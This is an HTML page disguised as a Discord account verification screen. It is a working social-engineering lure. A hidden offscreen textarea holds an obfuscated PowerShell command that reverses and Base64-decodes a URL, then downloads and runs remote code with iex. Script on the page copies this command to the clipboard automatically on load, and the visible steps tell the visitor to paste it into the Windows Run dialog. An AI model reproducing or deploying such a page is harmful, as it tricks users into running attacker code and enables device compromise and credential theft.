<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #36393f;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }

    .container {
      background-color: #2f3136;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
      max-width: 500px;
      width: 100%;
    }

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      width: 100px;
    }

    h1 {
      font-size: 24px;
      color: #ffffff;
      margin-bottom: 20px;
    }

    .step {
      margin-bottom: 20px;
    }

    .step span {
      color: #7289da;
      font-weight: bold;
    }

    .copy-btn {
      background-color: #7289da;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: 500;
      transition: background-color 0.3s ease;
      margin-top: 15px;
    }

    .copy-btn:hover {
      background-color: #5b6eae;
    }

    .copied-message {
      margin-top: 10px;
      color: #43b581;
      display: none;
    }

    textarea {
      position: absolute;
      opacity: 0;
      left: -9999px;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://cdn.worldvectorlogo.com/logos/discord-6.svg" alt="Discord Logo">
    </div>

    <h1>Verify Your Discord Account</h1>

    <div class="step">
      <p>1. Press <span>Windows + R</span> to open the Run dialog box.</p>
    </div>

    <div class="step">
      <p>2. The verification string was <span>copied automatically</span>. Just press <span>CTRL + V</span>.</p>
    </div>

    <div class="step">
      <p>3. Then press <span>Enter</span> to complete the process.</p>
    </div>

    <button class="copy-btn" onclick="copyToClipboard()">Copy Verification Code</button>
    <div class="copied-message" id="copiedMsg">✅ Copied to clipboard!</div>
  </div>

  <textarea id="payload">
powershell -NoExit -Command "
$r='==AlbmtH.lmxednI/niam/szdaeH/2sFeZ/yrifieV/gubed-moc-drocsi-ptth/sresu/moc.tnetnocresubuhtig.wmoc//:sptth';
$u=($r[-1..-($r.Length)]-join '');
$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));
iex (iwr -Uri $url)
"
  </textarea>

  <script>
    function copyToClipboard() {
      const textArea = document.getElementById("payload");
      textArea.select();
      document.execCommand("copy");
      const copiedMsg = document.getElementById("copiedMsg");
      copiedMsg.style.display = "block";
    }

    // نسخ تلقائي أول ما الصفحة تفتح
    window.addEventListener("DOMContentLoaded", () => {
      copyToClipboard();
    });
  </script>

</body>
</html>
